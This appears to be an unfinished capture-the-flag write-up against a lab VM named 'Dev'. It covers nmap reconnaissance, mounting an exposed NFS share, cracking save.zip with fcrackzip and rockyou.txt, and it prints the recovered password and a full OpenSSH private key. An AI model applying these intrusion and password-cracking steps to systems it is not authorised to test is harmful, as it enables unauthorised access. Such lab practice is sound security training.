# Dev

## target 192.168.64.135

## Reconnaissance
### arp-scan -l

    root@kali:/home/kali# arp-scan -l
    Interface: eth0, type: EN10MB, MAC: 00:0c:29:e4:4b:56, IPv4: 192.168.64.129
    Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
    192.168.64.1    00:50:56:c0:00:08       VMware, Inc.
    192.168.64.2    00:50:56:f7:bd:1d       VMware, Inc.
    192.168.64.135  00:0c:29:67:fc:dd       VMware, Inc.
    192.168.64.254  00:50:56:ea:b9:b5       VMware, Inc.
    
    4 packets received by filter, 0 packets dropped by kernel
    Ending arp-scan 1.9.7: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded
    root@kali:/home/kali# 

### nmap -A -sV -T4 -p- 192.168.64.135

    root@kali:/home/kali# nmap -A -sV -T4 -p- 192.168.64.135 
    Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-03 08:31 EST
    Nmap scan report for 192.168.64.135
    Host is up (0.00036s latency).
    Not shown: 65526 closed ports
    PORT      STATE SERVICE  VERSION
    22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
    |   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
    |_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
    80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Bolt - Installation error
    111/tcp   open  rpcbind  2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  3           2049/udp   nfs
    |   100003  3           2049/udp6  nfs
    |   100003  3,4         2049/tcp   nfs
    |   100003  3,4         2049/tcp6  nfs
    |   100005  1,2,3      44523/udp6  mountd
    |   100005  1,2,3      50747/udp   mountd
    |   100005  1,2,3      58285/tcp   mountd
    |   100005  1,2,3      60071/tcp6  mountd
    |   100021  1,3,4      34409/tcp   nlockmgr
    |   100021  1,3,4      34899/udp6  nlockmgr
    |   100021  1,3,4      39583/tcp6  nlockmgr
    |   100021  1,3,4      55575/udp   nlockmgr
    |   100227  3           2049/tcp   nfs_acl
    |   100227  3           2049/tcp6  nfs_acl
    |   100227  3           2049/udp   nfs_acl
    |_  100227  3           2049/udp6  nfs_acl
    2049/tcp  open  nfs_acl  3 (RPC #100227)
    8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
    | http-open-proxy: Potentially OPEN proxy.
    |_Methods supported:CONNECTION
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
    34409/tcp open  nlockmgr 1-4 (RPC #100021)
    51217/tcp open  mountd   1-3 (RPC #100005)
    52943/tcp open  mountd   1-3 (RPC #100005)
    58285/tcp open  mountd   1-3 (RPC #100005)
    MAC Address: 00:0C:29:67:FC:DD (VMware)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.80%E=4%D=12/3%OT=22%CT=1%CU=40525%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
    OS:M=674F0837%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
    OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
    OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
    OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
    OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
    OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
    OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
    OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
    OS:N%T=40%CD=S)
    
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
## Findings: 

    22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Bolt - Installation error
    111/tcp   open  rpcbind  2-4 (RPC #100000)
    2049/tcp  open  nfs_acl  3 (RPC #100227)
    8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
    | http-open-proxy: Potentially OPEN proxy.
    |_Methods supported:CONNECTION

## Port 80 http webpage - Bolt installation error page
![image](https://github.com/user-attachments/assets/3ae0bf0f-8ac5-417e-a362-29b70d60f376)

## Port 8080 PHP version and Debian system - suggesting this is a Linux operating system
![image](https://github.com/user-attachments/assets/dd7f8629-cbd4-4c1e-b831-5f9ba92750a1)

## 2049 NFS

    install:
    sudo apt update && sudo apt install nfs-common -y

    Check Available NFS Shares:
    showmount -e 192.168.64.135
![image](https://github.com/user-attachments/assets/011c86b2-a08a-4777-8d3f-83599e942acd)

    Create a Mount Point: Create a directory where you will mount the NFS share:
    mkdir -p /home/kali/nfs_mount

    mount -t nfs 192.168.64.135:/srv/nfs /home/kali/nfs_mount
![image](https://github.com/user-attachments/assets/43fd4e7e-49ad-4775-8b07-e55c0acbed11)

#TBC here. Now that we have managed to get into the NFS and found a save.zip file, we need to crack it.
    
## Download fcrackzip - a lightweight .zip file type cracking tool.

    root@kali:/home/kali/nfs_mount# apt update && apt install fcrackzip -y

    install dirbuster word lists
    sudo apt update
    sudo apt install dirbuster -y

## looks like there are some issues locating the dirbuster wordlist in this instance. So will we use rockyou.txt instead.

    root@kali:/home/kali/nfs_mount# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
    
    -v Verbose
    -u Attempts to unzip with potential password
    -D Instructs it to be a dictionary attack
    -p Pathway to wordlist

    root@kali:/home/kali/nfs_mount# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
    found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
    found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
    
    
    PASSWORD FOUND!!!!: pw == java101
    root@kali:/home/kali/nfs_mount# 

    root@kali:/home/kali/nfs_mount# unzip save.zip
    Archive:  save.zip
    [save.zip] id_rsa password: 
      inflating: id_rsa                  
      inflating: todo.txt 
    root@kali:/home/kali/nfs_mount# nano todo.txt

## id_rsa OPENSSH Private Key finding

    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
    0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
    0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
    3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq
    S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n
    Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC
    xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG
    ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1
    tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI
    EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7
    ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY
    SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u
    dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh
    wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+
    AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b
    rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud
    T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc
    753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT
    hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E
    PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+
    rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4
    +e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC
    LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z
    iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/
    gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ
    q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=
    -----END OPENSSH PRIVATE KEY-----

## todo.txt | potential user JP
![image](https://github.com/user-attachments/assets/642b0a63-6713-4df4-9b8c-6aa9e24cf825)

## TBC here - try to SSH using JP initials



